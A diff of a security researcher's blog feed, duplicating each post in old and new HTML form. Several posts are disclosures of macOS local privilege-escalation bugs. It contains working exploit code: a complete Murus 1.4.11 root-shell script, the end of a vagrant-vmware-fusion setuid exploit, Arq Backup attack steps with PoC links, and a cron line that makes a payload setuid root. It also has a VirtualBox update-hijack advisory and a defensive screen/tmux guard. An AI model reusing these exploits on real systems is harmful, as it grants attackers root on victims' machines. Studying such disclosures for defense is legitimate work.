-system(&quot;/Users/#{ENV[&quot;USER&quot;]}/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status&quot;)
+fi</p><p>cat > ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb <<EOF
+system("/Users/#{ENV["USER"]}/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/bin/vagrant_vmware_desktop_sudo_helper_darwin_amd64 vmnet -status")
 exit 0
-EOF
-
-success=0
-
-export PATH=.:$PATH
-
-function attempt()
+EOF</p><p>success=0</p><p>export PATH=.:$PATH</p><p>function attempt()
 {
-  cat &gt; /tmp/vvp_504.c &lt;&lt;EOF
-#include &lt;unistd.h&gt;
-#include &lt;stdlib.h&gt;
+  cat > /tmp/vvp_504.c <<EOF
+#include <unistd.h>
+#include <stdlib.h>
 int main(int ac, char *av[])
 {
   if (geteuid() == 0) {
     setuid(0);
     setgid(0);
-    system(&quot;chown root:wheel /tmp/vvp_504&quot;);
-    system(&quot;chmod 4755 /tmp/vvp_504&quot;);
+    system("chown root:wheel /tmp/vvp_504");
+    system("chmod 4755 /tmp/vvp_504");
   }
-  execv(&quot;/usr/bin/$1&quot;,av);
+  execv("/usr/bin/$1",av);
   return 0;
 }
 EOF
   gcc -o $1 /tmp/vvp_504.c
-  rm -f /tmp/vvp_504.c
-
-  `ruby ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb 2&gt;/dev/null`
-
-  r=`ls -la /tmp/vvp_504 |grep &#x27;\-rws&#x27; |grep root`
-
-  if [ &quot;$r&quot; != &quot;&quot; ] ; then
+  rm -f /tmp/vvp_504.c</p><p>  `ruby ~/.vagrant.d/gems/$gem_version/gems/vagrant-vmware-fusion-$plugin_version/lib/vagrant-vmware-fusion/driver.rb 2>/dev/null`</p><p>  r=`ls -la /tmp/vvp_504 |grep '\-rws' |grep root`</p><p>  if [ "$r" != "" ] ; then
     cleanup
     cd
     /tmp/vvp_504
@@ -1618,16 +972,10 @@ EOF
   else
     rm -f $1
   fi
-}
-
-attempt &quot;lsof&quot;
-attempt &quot;sed&quot;
-attempt &quot;awk&quot;
-
-cleanup
-
-echo &quot;not vulnerable&quot;
-</pre></summary>
+}</p><p>attempt "lsof"
+attempt "sed"
+attempt "awk"</p><p>cleanup</p><p>echo "not vulnerable"
+</p></summary>
     <title>CVE-2017-16873 Hashicorp vagrant-vmware-fusion v4.0.25-5.0.4 local root</title>
     <updated>2018-03-28T07:22:01+00:00</updated>
     <dc:date>2018-03-28T07:22:01+00:00</dc:date>
@@ -1635,22 +983,14 @@ echo &quot;not vulnerable&quot;
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>I have released three cryptocurrency mining projects:
-
-- Fanotaur: independently monitors Nvidia card temperatures and regulates fan
-  speeds to keep them at a preset temperature.
-
-- Minotaur: derives calibrated hashrates and power limits from your devices for
+    <summary><p>I have released three cryptocurrency mining projects:</p><p><pre>- Fanotaur: independently monitors Nvidia card temperatures and regulates fan
+  speeds to keep them at a preset temperature.</pre></p><p>- Minotaur: derives calibrated hashrates and power limits from your devices for
   various crypto algorithms so as to get the maximum hashrate with the lowest
   power limit. Monitors Nicehash market prices every 15s and ensures your
   devices are always mining the most profitable algorithm. Has a sexy top-style
-  ncurses interface for monitoring and supports multiple miners.
-
-- Excavataur: shim that provides an Excavator style API so that Minotaur can
-  talk to multiple mining tools via a unified interface.
-
-We have great things planned for Minotaur!
-</pre></summary>
+  ncurses interface for monitoring and supports multiple miners.</p><p>- Excavataur: shim that provides an Excavator style API so that Minotaur can
+  talk to multiple mining tools via a unified interface.</p><p>We have great things planned for Minotaur!
+</p></summary>
     <title>Minotaur, Fanotaur and Excavataur</title>
     <updated>2018-01-31T08:53:37+00:00</updated>
     <dc:date>2018-01-31T08:53:37+00:00</dc:date>
@@ -1658,81 +998,47 @@ We have great things planned for Minotaur!
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>Last year I found a couple more privilege escalation vectors in Arq Backup
-for Mac version 5.10. Both have now been fixed in the latest release.
-
-The first is relatively simple - the arq_updater binary (which runs as root)
+    <summary><p>Last year I found a couple more privilege escalation vectors in Arq Backup
+for Mac version 5.10. Both have now been fixed in the latest release.</p><p>The first is relatively simple - the arq_updater binary (which runs as root)
 takes a path argument for the url to retrieve an Arq update from in the format
 Arq.zip. We can simply specify an arbitrary path - eg file:///tmp/blah/Arq.zip -
 on the local filesystem and this will get unzipped in the /Applications/
-directory. Although we can&#x27;t embed suid permissions into a zip file the updater
+directory. Although we can't embed suid permissions into a zip file the updater
 binary sets +s on a handful of binaries as part of the installation process
-without validation.
-
-This means we can simply substitute one of these binaries in an arbitrary
+without validation.</p><p>This means we can simply substitute one of these binaries in an arbitrary
 Arq.zip with a payload that will then receive the +s bit as well as root
-ownership.
-
-The second issue is a bit more involved and actually rather cool from an
-exploitation point of view :)
-
-The restorer binaries which were subject to direct privilege escalation in
+ownership.</p><p>The second issue is a bit more involved and actually rather cool from an
+exploitation point of view :)</p><p>The restorer binaries which were subject to direct privilege escalation in
 versions prior to 5.10 run as root. This means that when restoring files the
 process has privileges to write to anything that root can write to. The paths to
 restore files to are set by the Arq UI application and are either the original
-path of the backed up file or a computed path prefixed with &quot;Restored by Arq&quot;
-that the application carefully ensures is unique.
-
-However this path is passed to the restorer binary through the inter-app
+path of the backed up file or a computed path prefixed with "Restored by Arq"
+that the application carefully ensures is unique.</p><p>However this path is passed to the restorer binary through the inter-app
 protocol that I reversed in a previous exploit, which means if we know how to
 talk to it we can specify an arbitrary restore path. So a local non-root user
 can drop a file into their home directory and then with a specially crafted
 payload, trigger the standardrestorer binary to restore it place of any file
-on the system.
-
-An interesting target for this is the root users crontab file at:
-
-/var/at/tabs/root
-
-It turns out that if a file appears at this path, even if it isn&#x27;t root-owned,
+on the system.</p><p>An interesting target for this is the root users crontab file at:</p><p><pre>/var/at/tabs/root</pre></p><p>It turns out that if a file appears at this path, even if it isn't root-owned,
 it will be immediately processed by the cron system and any commands within will
-be executed as root (this oversight was reported to Apple).
-
-So, theoretically at this point we can create a cron file in the user&#x27;s home
+be executed as root (this oversight was reported to Apple).</p><p>So, theoretically at this point we can create a cron file in the user's home
 directory, wait for it to get backed up by Arq and then restore it in place of
-the root crontab in order to escalate to root access.
-
-The only thing in the way of this working is the HMAC validation. Every file
+the root crontab in order to escalate to root access.</p><p>The only thing in the way of this working is the HMAC validation. Every file
 backed up by Arq has a computed HMAC hash stored with the file and the restorer
 binaries validate this when restoring. There will typically be millions of files
 in the backup and we need to know the exact HMAC of the file, which is derived
-using a secret key stored in the login keychain.
-
-To figure this out we can, before doing anything else, dump the list of HMACs
+using a secret key stored in the login keychain.</p><p>To figure this out we can, before doing anything else, dump the list of HMACs
 from the cache files in ~/Library/Arq/. The HMACs are sha1 hashes so simply
 making a unique list of anything that looks like a sha1 hash will be sufficient.
 We can then create our crontab file, wait for the next backup run and then scan
 the cache files again. Discarding any hashes that we saw the first time will
 give us a much smaller list of potential HMACs for the backed up file which we
-can trivially brute-force.
-
-After the cron file is restored we just wait up to 60 seconds for the minute
-cron interval to arrive and our payload gets executed.
-
-Both of these issues are fixed in the latest release of Arq.
-
-CVE-2017-16928 backup/restore exploit PoC:
-
-https://m4.rkw.io/arq_5.10.rb.txt
+can trivially brute-force.</p><p>After the cron file is restored we just wait up to 60 seconds for the minute
+cron interval to arrive and our payload gets executed.</p><p>Both of these issues are fixed in the latest release of Arq.</p><p>CVE-2017-16928 backup/restore exploit PoC:</p><p><pre>https://m4.rkw.io/arq_5.10.rb.txt
 98428e05e5a4c1a289e1077787adffd97dd422dc0073bafdc25a07e5e6788cb8
-------------------------------------------------------------------------------
-
-CVE-2017-16945 update mechanism exploit PoC:
-
-https://m4.rkw.io/arq_5.10.sh.txt
+------------------------------------------------------------------------------</pre></p><p>CVE-2017-16945 update mechanism exploit PoC:</p><p><pre>https://m4.rkw.io/arq_5.10.sh.txt
 1557066028363d7961ec04d7af52cdab41a34234c5aa1e9fe22d0ca36ab651e1
 ------------------------------------------------------------------------------
-</pre></summary>
+</pre></p></summary>
     <title>Two local root privesc bugs in Arq Backup <= 5.10</title>
     <updated>2018-01-29T06:33:01+00:00</updated>
     <dc:date>2018-01-29T06:33:01+00:00</dc:date>
@@ -1740,201 +1046,113 @@ https://m4.rkw.io/arq_5.10.sh.txt
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>It occurred to me recently that a lot of people probably use screen or tmux in
+    <summary><p>It occurred to me recently that a lot of people probably use screen or tmux in
 ways that leave an easy path to privilege escalation open. For example if you
 start a screen session as your local user and then escalate to root inside the
 screen session. As soon as you do that, anyone with access to the non-root
-account can simply resume the screen session and immediately be root.
-
-It is therefore sensible to never do this and always escalate *before* starting
-a screen or tmux session. I&#x27;m pretty sure I&#x27;ve done this loads of times without
-really thinking about it. I decided to look into simple ways to mitigate this.
-
-On linux it&#x27;s pretty easy, we can add this code to /root/.bashrc:
-
--------------------------------------------------------------------------------
-pid=$$
-
-screen=`which screen`
-tmux=`which tmux`
-
-while :
+account can simply resume the screen session and immediately be root.</p><p>It is therefore sensible to never do this and always escalate *before* starting
+a screen or tmux session. I'm pretty sure I've done this loads of times without
+really thinking about it. I decided to look into simple ways to mitigate this.</p><p>On linux it's pretty easy, we can add this code to /root/.bashrc:</p><p><pre>-------------------------------------------------------------------------------
+pid=$$</pre></p><p>screen=`which screen`
+tmux=`which tmux`</p><p>while :
 do
-  parent=`ps -o ppid= $pid 2&gt;/dev/null | xargs`
-
-  if [ &quot;$parent&quot; == &quot;1&quot; ] ; then
+  parent=`ps -o ppid= $pid 2>/dev/null | xargs`</p><p>  if [ "$parent" == "1" ] ; then
     break
-  fi
-
-  exe=`readlink -f /proc/$parent/exe`
-  owner=`ps h -o ruser -p $parent`
-
-  if [ &quot;$owner&quot; != &quot;root&quot; ] ; then
-    if [ &quot;$exe&quot; == &quot;$screen&quot; -o &quot;$exe&quot; == &quot;$tmux&quot; ] ; then
-      echo &quot;unsafe escalation - escalate to root *before* running screen/tmux!&quot;
-      kill -9 `ps -o ppid= $$ 2&gt;/dev/null | xargs`
+  fi</p><p>  exe=`readlink -f /proc/$parent/exe`
+  owner=`ps h -o ruser -p $parent`</p><p>  if [ "$owner" != "root" ] ; then
+    if [ "$exe" == "$screen" -o "$exe" == "$tmux" ] ; then
+      echo "unsafe escalation - escalate to root *before* running screen/tmux!"
+      kill -9 `ps -o ppid= $$ 2>/dev/null | xargs`
       exit 0
     fi
-  fi
-
-  pid=$parent
+  fi</p><p>  pid=$parent
 done
--------------------------------------------------------------------------------
-
-Now if we spawn a root-owned shell from inside a screen this code will execute
+-------------------------------------------------------------------------------</p><p>Now if we spawn a root-owned shell from inside a screen this code will execute
 when it starts up. It walks up the parent process hierarchy and if it finds
 screen or tmux running as a non-root user it will terminate its parent and thus
-kill the escalation. This is what we see when this happens:
-
-$ screen
+kill the escalation. This is what we see when this happens:</p><p><pre>$ screen
 $ sudo bash
 [sudo] password for user:
 unsafe escalation - escalate to root *before* running screen/tmux!
 Killed
-a ~ $
-
-Of course we can still escalate to root *outside* the screen session and we
-can still use sudo for other things inside screen that won&#x27;t leave a root-owned
-shell running.
-
-Doing this on macOS is a bit more complicated for a couple of reasons - firstly
-there&#x27;s the issue I blogged about here:
-
-https://m4.rkw.io/blog/macos-sudo-wtf.html
-
-In that the default sudoers file that ships with macOS has the HOME path set to
-inherit when escalating with sudo, leading to your local admin&#x27;s dotfiles being
+a ~ $</pre></p><p>Of course we can still escalate to root *outside* the screen session and we
+can still use sudo for other things inside screen that won't leave a root-owned
+shell running.</p><p>Doing this on macOS is a bit more complicated for a couple of reasons - firstly
+there's the issue I blogged about here:</p><p><pre>https://m4.rkw.io/blog/macos-sudo-wtf.html</pre></p><p>In that the default sudoers file that ships with macOS has the HOME path set to
+inherit when escalating with sudo, leading to your local admin's dotfiles being
 executed as root when you escalate. I would strongly recommend disabling this.
 If you like the convenience of keeping your HOME environment variable when
-escalating you can simply add this to /var/root/.bashrc:
-
-export HOME=/Users/user
-
-(or whatever your home path is). This gives you basically the same convenience
+escalating you can simply add this to /var/root/.bashrc:</p><p><pre>export HOME=/Users/user</pre></p><p>(or whatever your home path is). This gives you basically the same convenience
 without the security compromise of having your dotfiles executed as root every
-time.
-
-But I digress. For the purposes of this post I&#x27;ll assume that you have made this
+time.</p><p>But I digress. For the purposes of this post I'll assume that you have made this
 change and that when you sudo your /var/root/.bashrc is the one that gets
-executed rather than the non-root user&#x27;s one.
-
-The second problem with doing this on macOS is that there&#x27;s not (at least as far
+executed rather than the non-root user's one.</p><p>The second problem with doing this on macOS is that there's not (at least as far
 as I know) an easy way to look up the real binary path for a process without
 using a system call. We have no handy proc filesystem like we have on linux and
-I&#x27;m not really a big fan of fuse.
-
-So first we need to write a little tool that will take a process id and give us
-the real path to its binary:
-
--------------------------------------------------------------------------------
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;libproc.h&gt;
-
-int main (int argc, char* argv[])
+I'm not really a big fan of fuse.</p><p>So first we need to write a little tool that will take a process id and give us
+the real path to its binary:</p><p><pre>-------------------------------------------------------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <libproc.h></pre></p><p>int main (int argc, char* argv[])
 {
     pid_t pid; int ret;
     char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
-    int i;
-
-    if (argc &lt; 2) {
-      printf(&quot;usage: %s &lt;pid&gt;\n&quot;, argv[0]);
+    int i;</p><p>    if (argc < 2) {
+      printf("usage: %s <pid>\n", argv[0]);
       return 0;
-    }
-
-    ret = proc_pidpath (atoi(argv[1]), pathbuf, sizeof(pathbuf));
-
-    if ( ret &gt; 0 ) {
-      printf(&quot;%s\n&quot;, pathbuf);
+    }</p><p>    ret = proc_pidpath (atoi(argv[1]), pathbuf, sizeof(pathbuf));</p><p>    if ( ret > 0 ) {
+      printf("%s\n", pathbuf);
     } else {
-      fprintf(stderr, &quot;%s\n&quot;, strerror(errno));
-    }
-
-    return 0;
+      fprintf(stderr, "%s\n", strerror(errno));
+    }</p><p>    return 0;
 }
--------------------------------------------------------------------------------
-
-Stick this in /usr/local/bin/ like so:
-
-$ sudo gcc -o /usr/local/bin/psr psr.c
-
-Now we can grab the real binary path for any process:
-
-$ psr $$
+-------------------------------------------------------------------------------</p><p>Stick this in /usr/local/bin/ like so:</p><p><pre>$ sudo gcc -o /usr/local/bin/psr psr.c</pre></p><p>Now we can grab the real binary path for any process:</p><p><pre>$ psr $$
 /bin/bash
-$
-
-Cool. By the way the proc_pidpath() system call is quite handy when examining
+$</pre></p><p>Cool. By the way the proc_pidpath() system call is quite handy when examining
 processes on your system. The process name shown in the ps output can be easily
 manipulated by overwriting argv[0] but I have no found a way to mask the real
 binary path returned by proc_pidpath(). It seems to be a low-level kernel
-function.
-
-So now we just need a bit of bash similar to the linux version in our
-/var/root/.bashrc file:
-
--------------------------------------------------------------------------------
+function.</p><p>So now we just need a bit of bash similar to the linux version in our
+/var/root/.bashrc file:</p><p><pre>-------------------------------------------------------------------------------
 screen=`which screen`
-tmux=`which tmux`
-
-function expand_path()
+tmux=`which tmux`</pre></p><p>function expand_path()
 {
-  p=$1
-
-  while :
+  p=$1</p><p>  while :
   do
-    realpath=`python -c &#x27;import os,sys;print(os.path.realpath(sys.argv[1]))&#x27; $p`
-    if [ &quot;$realpath&quot; == &quot;$p&quot; ] ; then
+    realpath=`python -c 'import os,sys;print(os.path.realpath(sys.argv[1]))' $p`
+    if [ "$realpath" == "$p" ] ; then
       break
     fi
     p=$realpath
   done
-}
-
-if [ &quot;$screen&quot; != &quot;&quot; ] ; then
+}</p><p>if [ "$screen" != "" ] ; then
   expand_path $screen
   screen=$p
-fi
-
-if [ &quot;$tmux&quot; != &quot;&quot; ] ; then
+fi</p><p>if [ "$tmux" != "" ] ; then
   expand_path $tmux
   tmux=$p
-fi
-
-pid=$$
-
-while :
+fi</p><p>pid=$$</p><p>while :
 do
-  parent=`ps -o ppid= $pid 2&gt;/dev/null | xargs`
-
-  if [ &quot;$parent&quot; == &quot;1&quot; ] ; then
+  parent=`ps -o ppid= $pid 2>/dev/null | xargs`</p><p>  if [ "$parent" == "1" ] ; then
     break
-  fi
-
-  exe=`/usr/local/bin/psr $parent`
-  owner=`ps h -o ruser= $parent`
-
-  if [ &quot;$owner&quot; != &quot;root&quot; ] ; then
-    if [ &quot;$exe&quot; == &quot;$screen&quot; -o &quot;$exe&quot; == &quot;$tmux&quot; ] ; then
-      echo &quot;unsafe escalation - don&#x27;t do this in a non-root screen/tmux session!&quot;
-      kill -9 `ps -o ppid= $$ 2&gt;/dev/null | xargs`
+  fi</p><p>  exe=`/usr/local/bin/psr $parent`
+  owner=`ps h -o ruser= $parent`</p><p>  if [ "$owner" != "root" ] ; then
+    if [ "$exe" == "$screen" -o "$exe" == "$tmux" ] ; then
+      echo "unsafe escalation - don't do this in a non-root screen/tmux session!"
+      kill -9 `ps -o ppid= $$ 2>/dev/null | xargs`
       exit 0
     fi
-  fi
-
-  pid=$parent
+  fi</p><p>  pid=$parent
 done
--------------------------------------------------------------------------------
-
-It&#x27;s a little more complicated because macOS package managers often install
+-------------------------------------------------------------------------------</p><p>It's a little more complicated because macOS package managers often install
 binaries using symlinks. I use screen from macports because it seems to work
 better than the standard one but the path returned by which is a symlink which
-obviously isn&#x27;t useful if we&#x27;re comparing against the output of the
-proc_pidpath() call. Also macOS doesn&#x27;t seem to support readlink -f so we need
+obviously isn't useful if we're comparing against the output of the
+proc_pidpath() call. Also macOS doesn't seem to support readlink -f so we need
 to use a tiny bit of python to expand the symlinks.
-</pre></summary>
+</p></summary>
     <title>protecting against unsafe use of screen/tmux</title>
     <updated>2017-12-15T09:35:22+00:00</updated>
     <dc:date>2017-12-15T09:35:22+00:00</dc:date>
@@ -1942,31 +1160,17 @@ to use a tiny bit of python to expand the symlinks.
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>Recently I was working on a security issue in some other software that has yet
+    <summary><p>Recently I was working on a security issue in some other software that has yet
 to be disclosed which created a rather interesting condition. As a non-root
 user I was able to write to any file on the system that was not SIP-protected
-but the resulting file would not be root-owned, even if it previously was.
-
-This presented an interesting challenge for privilege escalation - how would you
+but the resulting file would not be root-owned, even if it previously was.</p><p>This presented an interesting challenge for privilege escalation - how would you
 exploit this to obtain root access? The obvious first attempt was the sudoers
-file but sudo is smart enough not to process it if the file isn&#x27;t root-owned so
-that didn&#x27;t work.
-
-I then discovered (after a tip from a friend - thanks pndc!) that the cron
+file but sudo is smart enough not to process it if the file isn't root-owned so
+that didn't work.</p><p>I then discovered (after a tip from a friend - thanks pndc!) that the cron
 system in macOS does not care who the crontab files are owned by. Getting root
-was a simple case of creating a crontab file at:
-
-/var/at/tabs/root
-
-with a 60-second cron line, eg:
-
-* * * * * chown root:wheel /tmp/payload &amp;&amp; chmod 4755 /tmp/payload
-
-and then waiting for it to execute. It&#x27;s not clear if this is a macOS-specific
-issue or a hangover from the BSD-inherited cron system, I suspect the latter.
-
-The issue has been reported to Apple so hopefully they will fix it.
-</pre></summary>
+was a simple case of creating a crontab file at:</p><p><pre>/var/at/tabs/root</pre></p><p>with a 60-second cron line, eg:</p><p><pre>* * * * * chown root:wheel /tmp/payload && chmod 4755 /tmp/payload</pre></p><p>and then waiting for it to execute. It's not clear if this is a macOS-specific
+issue or a hangover from the BSD-inherited cron system, I suspect the latter.</p><p>The issue has been reported to Apple so hopefully they will fix it.
+</p></summary>
     <title>macOS High Sierra 10.13.1 insecure cron system</title>
     <updated>2017-12-06T07:32:52+00:00</updated>
     <dc:date>2017-12-06T07:32:52+00:00</dc:date>
@@ -1974,99 +1178,63 @@ The issue has been reported to Apple so hopefully they will fix it.
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>I recently blogged about the prevalence of escalation hijack vulnerabilities
+    <summary><p>I recently blogged about the prevalence of escalation hijack vulnerabilities
 amongst macOS applications. One example of this is the latest version of Murus
 firewall. By design it requires the user to authenticate every time in order to
-obtain the access it needs to modify the firewall settings.
-
-If a local attacker or malware is running as an admin user (ie has write access
+obtain the access it needs to modify the firewall settings.</p><p>If a local attacker or malware is running as an admin user (ie has write access
 to /Applications/) they can subvert this process to silently obtain root access
-without the user knowing.
-
-https://m4.rkw.io/murus1.4.11.sh.txt
+without the user knowing.</p><p>https://m4.rkw.io/murus1.4.11.sh.txt
 9c332c07747e11c78c34f9dc8d30127250d95edd5e58a571ed1a005eafd32301
 -------------------------------------------------------------------------------
-#!/bin/bash
-
-##################################################################
+#!/bin/bash</p><p>##################################################################
 ###### Murus 1.4.11 local root privilege escalation exploit ######
 ###### by m4rkw - https://m4.rkw.io/blog.html               ######
-##################################################################
-
-echo &quot;compiling payloads...&quot;
-
-cat &gt; /tmp/murus411_exp.c &lt;&lt;EOF
-#include &lt;unistd.h&gt;
+##################################################################</p><p>echo "compiling payloads..."</p><p>cat > /tmp/murus411_exp.c <<EOF
+#include <unistd.h>
 int main()
 {
   setuid(0);
   seteuid(0);
-  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,&quot;-c&quot;,&quot;rm -f /tmp/murus411_exp; /bin/bash&quot;,NULL);
+  execl("/bin/bash","bash","-c","rm -f /tmp/murus411_exp; /bin/bash",NULL);
   return 0;
 }
-EOF
-
-gcc -o /tmp/murus411_exp /tmp/murus411_exp.c
-
-if [ ! $? -eq 0 ] ; then
+EOF</p><p>gcc -o /tmp/murus411_exp /tmp/murus411_exp.c</p><p>if [ ! $? -eq 0 ] ; then
   rm -f /tmp/murus411_exp.c
-	echo &quot;failed to compile, dev tools may not be installed&quot;
+	echo "failed to compile, dev tools may not be installed"
   exit 1
-fi
-
-rm -f /tmp/murus411_exp.c
-
-cat &gt; /tmp/murus411_exp2.c &lt;&lt;EOF
-#include &lt;unistd.h&gt;
-#include &lt;stdlib.h&gt;
+fi</p><p>rm -f /tmp/murus411_exp.c</p><p>cat > /tmp/murus411_exp2.c <<EOF
+#include <unistd.h>
+#include <stdlib.h>
 int main()
 {
   setuid(0);
   seteuid(0);
-  system(&quot;chown root:wheel /tmp/murus411_exp&quot;);
-  system(&quot;chmod 4755 /tmp/murus411_exp&quot;);
-  system(&quot;mv /Applications/Murus.app/Contents/MacOS/Murus.orig /Applications/\
-Murus.app/Contents/MacOS/Murus&quot;);
-  execl(&quot;/Applications/Murus.app/Contents/MacOS/Murus&quot;,&quot;Murus&quot;,NULL);
+  system("chown root:wheel /tmp/murus411_exp");
+  system("chmod 4755 /tmp/murus411_exp");
+  system("mv /Applications/Murus.app/Contents/MacOS/Murus.orig /Applications/\
+Murus.app/Contents/MacOS/Murus");
+  execl("/Applications/Murus.app/Contents/MacOS/Murus","Murus",NULL);
   return 0;
 }
-EOF
-
-gcc -o /tmp/murus411_exp2 /tmp/murus411_exp2.c
-rm -f /tmp/murus411_exp2.c
-
-echo &quot;waiting for loader...&quot;
-
-while :
+EOF</p><p>gcc -o /tmp/murus411_exp2 /tmp/murus411_exp2.c
+rm -f /tmp/murus411_exp2.c</p><p>echo "waiting for loader..."</p><p>while :
 do
-  ps auxwww |grep &#x27;/Applications/Murus.app/Contents/MacOS/MurusLoader&#x27; \
-    |grep -v grep 1&gt;/dev/null
+  ps auxwww |grep '/Applications/Murus.app/Contents/MacOS/MurusLoader' \
+    |grep -v grep 1>/dev/null
   if [ $? -eq 0 ] ; then
     break
   fi
-done
-
-echo &quot;planting payload...&quot;
-
-mv /Applications/Murus.app/Contents/MacOS/Murus /Applications/Murus.app/\
+done</p><p>echo "planting payload..."</p><p>mv /Applications/Murus.app/Contents/MacOS/Murus /Applications/Murus.app/\
 Contents/MacOS/Murus.orig
-mv /tmp/murus411_exp2 /Applications/Murus.app/Contents/MacOS/Murus
-
-echo &quot;waiting for payload to trigger...&quot;
-
-while :
+mv /tmp/murus411_exp2 /Applications/Murus.app/Contents/MacOS/Murus</p><p>echo "waiting for payload to trigger..."</p><p>while :
 do
   r=`ls -la /tmp/murus411_exp |grep root`
-  if [ &quot;$r&quot; != &quot;&quot; ] ; then
+  if [ "$r" != "" ] ; then
     break
   fi
   sleep 0.1
-done
-
-echo &quot;kapow&quot;
-
-/tmp/murus411_exp
-</pre></summary>
+done</p><p>echo "kapow"</p><p>/tmp/murus411_exp
+</p></summary>
     <title>Murus Firewall 1.4.11 escalation hihack / root privesc</title>
     <updated>2017-12-04T12:23:56+00:00</updated>
     <dc:date>2017-12-04T12:23:56+00:00</dc:date>
@@ -2074,41 +1242,23 @@ echo &quot;kapow&quot;
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>VirtualBox is a virtualisation application written by Oracle that is quite popular
-presumably because its free. I&#x27;m not a fan myself - if my mac locks up
-completely or kernel panics it&#x27;s usually because I&#x27;ve loaded the vbox kernel
+    <summary><p>VirtualBox is a virtualisation application written by Oracle that is quite popular
+presumably because its free. I'm not a fan myself - if my mac locks up
+completely or kernel panics it's usually because I've loaded the vbox kernel
 extensions less than 10 minutes ago. I use VMware Fusion instead (which is fairly
-expensive but IMO worth the money) and have a ritual whereby if I&#x27;ve had to load
+expensive but IMO worth the money) and have a ritual whereby if I've had to load
 the vbox kernel extensions for work-related reasons I will reboot the machine
-before doing anything else.
-
-I discovered back in May that if certain conditions are met it&#x27;s possible to
-achieve RCE in the VirtualBox application if you can MITM a user&#x27;s traffic. This
-is possible because, bizarrely, VirtualBox downloads updates over plain http:
-
-https://m4.rkw.io/img/vbox_nossl.png
-
-This is true for both the pkg installer (which carries an Apple Developer code
+before doing anything else.</p><p>I discovered back in May that if certain conditions are met it's possible to
+achieve RCE in the VirtualBox application if you can MITM a user's traffic. This
+is possible because, bizarrely, VirtualBox downloads updates over plain http:</p><p><pre>https://m4.rkw.io/img/vbox_nossl.png</pre></p><p>This is true for both the pkg installer (which carries an Apple Developer code
 signature, making tampering with it tricky) and also for the multi-architecture
-extension pack, which has no code signature.
-
-https://m4.rkw.io/img/vbox_nossl2.png
-
-Despite reporting this to Oracle nearly 7 months ago they still haven&#x27;t managed
+extension pack, which has no code signature.</p><p>https://m4.rkw.io/img/vbox_nossl2.png</p><p>Despite reporting this to Oracle nearly 7 months ago they still haven't managed
 to put an SSL certificate on the download site. Hopefully this advisory will
 make people aware of the issue and encourage them to manually verify the
-checksum of the extension pack should they be in a situation where they&#x27;ve
-downloaded it manually.
-
-Little Snitch shows that vbox does talk to update.virtualbox.org over https to
+checksum of the extension pack should they be in a situation where they've
+downloaded it manually.</p><p>Little Snitch shows that vbox does talk to update.virtualbox.org over https to
 retrieve the version information, but the extension pack itself is downloaded
-over http.
-
-https://m4.rkw.io/img/vbox_ls.png
-
-The extension pack for macOS is a gzipped tarball containing these files:
-
-ExtPack-license.html
+over http.</p><p>https://m4.rkw.io/img/vbox_ls.png</p><p>The extension pack for macOS is a gzipped tarball containing these files:</p><p><pre>ExtPack-license.html
 ExtPack-license.rtf
 ExtPack-license.txt
 ExtPack.manifest
@@ -2120,17 +1270,9 @@ linux.amd64
 linux.x86
 solaris.amd64
 win.amd64
-win.x86
-
-ExtPack.signature looked interesting and potentially would thwart this attack
-vector but at the time of writing it simply contains the string &quot;todo&quot; LOL.
-
-$ cat ExtPack.signature
-todo
-
-In the darwin.amd64 directory we have a bunch of dylibs:
-
-$ ls -1 darwin.amd64/
+win.x86</pre></p><p>ExtPack.signature looked interesting and potentially would thwart this attack
+vector but at the time of writing it simply contains the string "todo" LOL.</p><p>$ cat ExtPack.signature
+todo</p><p>In the darwin.amd64 directory we have a bunch of dylibs:</p><p><pre>$ ls -1 darwin.amd64/
 VBoxEhciR0.r0
 VBoxEhciR3.dylib
 VBoxEhciRC.rc
@@ -2142,111 +1284,63 @@ VBoxPuelMain.dylib
 VBoxUsbCardReaderR3.dylib
 VBoxUsbWebcamR3.dylib
 VBoxVRDP.dylib
-VDPluginCrypt.dylib
-
-These are dynamic libraries that VirtualBox loads in order to add additional
+VDPluginCrypt.dylib</pre></p><p>These are dynamic libraries that VirtualBox loads in order to add additional
 functionality. With a dylib you can define a custom constructor which will get
-executed as soon as the dylib is loaded. Something like this:
-
---------------------------------------
+executed as soon as the dylib is loaded. Something like this:</p><p><pre>--------------------------------------
 __attribute__((constructor))
 void customConstructor(int argc, char **argv)
 {
-  system(&quot;touch /tmp/LOL&quot;);
+  system("touch /tmp/LOL");
 }
---------------------------------------
-
-If VirtualBox loads this, the code in the constructor will get executed. The
